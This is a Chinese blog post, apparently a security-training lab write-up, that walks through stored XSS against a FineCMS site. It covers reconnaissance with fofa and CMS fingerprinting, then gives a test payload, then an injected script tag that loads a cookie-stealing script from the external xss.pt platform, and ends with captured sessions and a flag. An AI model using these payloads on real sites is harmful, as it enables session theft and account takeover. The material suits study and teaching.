---
date: "2020-12-25T00:00:00Z"
description: null
keywords: 安全, XSS, fofa
tags:
- 安全
- XSS
title: 存储型 XSS 利用
---

# 存储型XSS


## 0x00 写在前面

1.  任何事情切忌脑壳铁， **多听、多看、多梳理**才能快速构建**自己的知识树** ， 因而提高自己的快速检索能力。

2. 好文推荐 [循序渐进理解：跨源跨域，再到 XSS 和 CSRF - 双猫](https://catcat.cc/post/2020-06-23/)


## 信息收集

### fofa

进入 `https://fofa.so` 搜索网站地址

![](https://nc0.cdn.zkaq.cn/md/8461/e05f59b0f47fb0b744e9343f76d8d451_61120.png)

![](https://nc0.cdn.zkaq.cn/md/8461/93284c8f1a213159d3ebcf41fbfc4f6d_36878.png)


整理信息：

操作系统： windows
Web容器： `apache/2.4.23/(win32)`
开发语言版本: `php/5.4.45`


### cms 查询

**开发调试工具**

![](https://nc0.cdn.zkaq.cn/md/8461/34bef83517b77ed6b3e12748e32dac0e_21546.png)


**cms 指纹工具**

这里说一下小插曲， 有些在线 cms 网站装怪， 只能识别域名， IP加端口就不行。

这里， 可以使用 https://www.freenom.com/zh/index.html 搞一个免费域名绑定上， 就可以识别了。

![](https://nc0.cdn.zkaq.cn/md/8461/ed9aa6076073872b4747d44bd04ba484_36374.png)

**yunsee** : https://www.yunsee.cn/ ， 收费， 还不能直接给钱。

其他 github 上一大堆指纹识别工具。

假设， 我们通过工具识别出来了是 **finecms**


## Cms 渗透测试

### 已有漏洞搜索与利用

> 以铜为鉴，可以正衣冠，以人为鉴，可以知得失，以史为鉴，可以知兴替

搜索 **finecms 漏洞** ，得到信息还不少。类似于， sql注入， xss， 上传解析漏洞等比比皆是。

**做事踩坑是必然的， 但遇事不要死脑经。 **
**认真阅读和分析前辈的思路，才能快速拓宽视野，实现厚积薄发**

+ 参考资料:
	+ [Finecms 存储型XSS漏洞 - 查看日志 XSS](https://www.jianshu.com/p/200ea62486d9)
	+ [代码审计| FineCMS的GetShell姿势 - 查看留言 XSS](https://www.freebuf.com/column/165269.html)


### 确认 XSS 是否利用

根据文章指出，当访问不存在页面时，可能在日志触发存储型 XSS 利用漏洞。


**1. 快速测试**

通过浏览器构造页面访问请求，确认 XSS 漏洞是否存在

```bash
http://59.63.200.79:8082/index.php?c=mail&m=test123<img src=1.png onerror=alert(1)>
```

![](https://nc0.cdn.zkaq.cn/md/8461/c138aa4cd55253f5c2e268c0b2d90aa0_14010.png)

经确认， 该 XSS 漏洞可能依旧可以利用。


### 构建 XXS cookie 窃取语句

注册 XSS 平台账户
+ https://xss.pt/xss.php

**1. 创建项目**

**2. 生成偷cookie语句**


![](https://nc0.cdn.zkaq.cn/md/8461/65ec2a8b41853ff390c2e669d45dba7d_41229.png)

这里由于是后台日志，非勤劳的站长，可能并不会时时查看日志。 因此， **keepsession** 打开， 等待鱼儿上钩。

当然， 也可以去喂鱼。

```html
<sCRiPt sRC=//xss.pt/94ST></sCrIpT>
```

**3. 利用**

在浏览器输入渗透测试语句

```
http://59.63.200.79:8082/index.php?c=mail&m=test12123<sCRiPt sRC=//xss.pt/xxxxx></sCrIpT>
```

![](https://nc0.cdn.zkaq.cn/md/8461/aaa6e6d9ad2eb8995f2f7eeac715d6f7_35755.png)

**4. 收网**

等待结果

看到有两条鱼儿上钩
![](https://nc0.cdn.zkaq.cn/md/8461/62b5b99e996a227d189fc5a50d7bd738_66171.png)

获取 flag

```
flag=zKaQ-01sdfDCo0
```

